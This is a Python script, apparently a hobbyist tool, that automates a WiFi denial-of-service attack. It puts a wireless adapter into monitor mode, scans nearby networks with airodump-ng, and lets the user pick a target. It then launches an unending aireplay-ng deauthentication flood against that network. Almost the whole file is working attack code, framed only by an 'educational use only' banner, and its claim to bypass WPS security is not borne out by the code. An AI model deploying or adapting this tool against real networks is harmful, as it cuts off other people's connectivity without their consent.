import subprocess
import re
import csv
import requests
import os
import sys
import time
import random
import shutil
import datetime
from datetime import datetime

R = "\033[91;1m"  # Red
G = "\033[92;1m"  # Green
B = "\033[94;1m"  # Blue
Y = "\033[93;1m"  # Yellow
C = "\033[96;1m"  # Cyan
M = "\033[95;1m"  # Magenta
W = "\033[97;1m"  # White
D = "\033[90;1m"  # Grey
S = "\033[0m"

sign = "\033[92;1m" + "[" + "\033[94;1m" + "*" + "\033[92;1m" + "]" + "\033[94;1m"
Enter = "\033[94;1m" + "[" + "\033[92;1m" + "+" + "\033[94;1m" + "]" + "\033[92;1m"
ERROR = "\033[93;1m" + "[" + "\033[91;1m" + "ERROR" + "\033[93;1m" + "]" + "\033[91;1m"
INFO = "\033[93;1m" + "[" + "\033[92;1m" + "INFO" + "\033[93;1m" + "]" + "\033[94;1m"
warning = "\033[93;1m" + "[" + "\033[91;1m" + "WARNING" + "\033[93;1m" + "]" + "\033[91;1m"
Complete = "\033[94;1m" + "[" + "\033[92;1m" + "COMPLETE" + "\033[94;1m" + "]" + "\033[92;1m"
Failed = "\033[93;1m" + "[" + "\033[91;1m" + "FAILED" + "\033[93;1m" + "]" + "\033[91;1m"
please = "\033[93;1m" + "[" + "\033[91;1m" + "!" + "\033[93;1m" + "]" + "\033[91;1m"
Question = "\033[95;1m" + "[" + "\033[96;1m" + "?" + "\033[95;1m" + "]" + "\033[97;1m"
Help = "\033[97;1m" + "To continue anyway press or click" + "\033[94;1m" + " [" + "\033[92;1m" + "Enter" + "\033[94;1m" + "] " + "\033[97;1m" + "and to stop or exit" + "\033[93;1m" + " [" + "Ctrl" + "\033[97;1m" + " + " + "\033[93;1m" + "C" + "]" + "\033[0m"

timestamp = datetime.now()
now = datetime.now()
formatted_time = now.strftime("%I:%M %p")
formatted_day = now.strftime("%A")

date_day = "\033[94;1m" + "[" + "\033[92;1m" + "Today" + "\033[94;1m" + "]" + "\033[97;1m" + "(" + "\033[93;1m" + formatted_day + "\033[95;1m" + f" {now:%B %D %Y}" + "\033[97;1m" + ")" + "\033[94;1m" + "[" + "\033[92;1m" + "Time" + "\033[94;1m" + "]" + "\033[93;1m" + "[" + "\033[91;1m" + formatted_time + "\033[93;1m" + "]" + "\033[97;1m"

__all__ = ['R', 'G', 'B', 'Y', 'C', 'M', 'W', 'D', 'sign', 'Enter', 'ERROR', 'INFO', 'warning', 'Complete', 'Failed', 'Sorry', 'data']


def slowprint(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.01)

slowprint(f"""{sign} The attack has the ability to bypass security 
{sign} WPS
{sign} WPS2
{sign} WPS3\n""")

input(f"{Enter} Click to {B}[{B}Enter{B}] continue{B}")

os.system("clear")

def wait_with_spinner(seconds, colors):
    symbols = "/-|\\"

    for _ in range(int(seconds)):
        for symbol in symbols:
            random_color = random.choice(colors)
            colored_symbol = f"{random_color}{symbol}"
            sys.stdout.write(f"\r{sign} Please wait....! {colored_symbol}  ")
            sys.stdout.flush()
            time.sleep(0.25)

    sys.stdout.write("\r" + " " * 30 + "\r")

wait_time = 2.5
colors = [G, R, B, Y, C, M, W, D]
wait_with_spinner(wait_time, colors)

active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status
input(f"{Enter} {W}The tool is dangerous for educational use only {Help}")
os.system("clear")

def check_internet_connection():
    url = "http://www.google.com"
    timeout = 5
    try:
        _ = requests.get(url, timeout=timeout)
        return f"{G}Open {W}"
    except requests.ConnectionError:
        return f"{R}Close{Y}"

status = check_internet_connection()

print(rf"""
{G}  .;'                     `;,   {W}+----------------------------+ 
{G} .;'  ,;'             `;,  `;,  {W}| {B}By {W}: {Y}Hussein Alhillo{W}           |
{G}.;'  ,;'  ,;'     `;,  `;,  `;, {W}+----------------------------+
{G}::   ::   :   {W}( ){G}   :   ::   :: {W}| {B}My Instgram {W}: {G}3x_n{W}         |
{G}':.  ':.  ':. {W}/_\{G} ,:'  ,:'  ,:' {W}+----------------------------+
{G} ':.  ':.    {W}/___\{G}   ,:'   ,:'  {W}| {M}Internet connection : {status}|
{G}   ':.      {W}/_____\{G}      ,:'    {W}+----------------------------+
           {W}/       \            {date_day}{W}
  ____       ______        ___  __ _ 
 |  _ \  ___/ ___\ \      / (_)/ _(_)
 | | | |/ {R}_{W} \___ \\ \ /\ / /| | |_| |
 | |_| | {R}(0){W} |__) |\ V  V / | |  _| |
 |____/ \_{R}^{W}_/____/  \_/\_/  |_|_| |_|                                  
""")

try:
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{ERROR} {W}please use {Y}root{W} Type a command {R}sudo{W}")
        exit() 

    for file_name in os.listdir():

        if ".csv" in file_name:
            print(f"{sign} There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print(f"{sign} Backup folder exists.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    wlan_pattern = re.compile("wlan[0-9]")

    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print(f"{ERROR} Please connect a WiFi adapter and try again.{W}")
        exit()

    print(f"{sign} The following WiFi interfaces are available:{W}")
    for index, item in enumerate(check_wifi_result):
        print(f"  {index} - {item}")

    while True:
        wifi_interface_choice = input(f"{Enter} Please select the interface you want to use for the attack: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print(f"{ERROR} Please enter a number that corresponds with the choices available.")

    hacknic = check_wifi_result[int(wifi_interface_choice)]

    print(f"{Enter} WiFi adapter connected!")
    print(f"{sign} Now let's kill conflicting processes:")

    print(f"{sign}Putting Wifi adapter into monitored mode:")
    subprocess.run(["ip", "link", "set", hacknic, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", hacknic, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", hacknic, "up"])

    discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:

            subprocess.call("clear", shell=True)
            for file_name in os.listdir():

                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)

                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
            print(rf"""{W}
                                _________-----_____ 
                     _____------           __      ----_ 
             ___----             ___------              \ 
                ----________        ----                 \ 
                            -----__    |             {R}_____{W}) 
                                 __-                {R}/#####{W}\ 
                     _______-----    ___--          {R}\####{W}/)\ 
               ------_______      ---____            {R}\##{W}/  / 
                            -----__    \ --    _      --   /\   
                                   --__--__     \_____/   \_/\ 
{R}██████╗ ██╗  ██╗        ███╗   ██╗{W}        ----|   /          | 
{R}╚════██╗╚██╗██╔╝        ████╗  ██║{W}            |  |___________| 
{R} █████╔╝ ╚███╔╝         ██╔██╗ ██║{W}            |  | ((_(_)| )_) 
{R} ╚═══██╗ ██╔██╗         ██║╚██╗██║{W}            |  \_((_(_)|/(_) 
{R}██████╔╝██╔╝ ██╗███████╗██║ ╚████║{W}            \             ( 
{R}╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝{W}             \_____________)
""")
            print(f"{sign} Scanning Press {Y}Ctrl {W}+ {Y}C{W} {B}when you want to select which wireless network you want to attack.{W}\n")
            print(f"{W}+----+---------------------+------------+--------------------------------------+")
            print(f"| {G}ID{W} |      {B}BSSID{W}          |   {M}Channel{W}  |               {Y}ESSID{W}                  |")
            print(f"{W}+----+---------------------+------------+--------------------------------------|")
            for index, item in enumerate(active_wireless_networks):
                print(f"| {index:2d} | {item['BSSID']}   | {item['channel'].strip():10s} | {item['ESSID']:33s}    |")
            print(f"{W}+----+---------------------+------------+--------------------------------------+")
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{sign} Ready to make choice.{W}")

    while True:

        choice = input(f"{Enter} Please select a choice from above: {Y}")
        print(f"{G}")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print(f"{ERROR} Please try again!")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

    subprocess.run(["airmon-ng", "start", hacknic, hackchannel])

    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
    except KeyboardInterrupt:
        print(f"\n{Complete}{W}")
        print(f"{sign} {W}To restart the Internet type a command {B}$ {G}sudo {B}python3 {W}control.py")
except KeyboardInterrupt:
    print(f"\n{R}[Exiting]{W}")
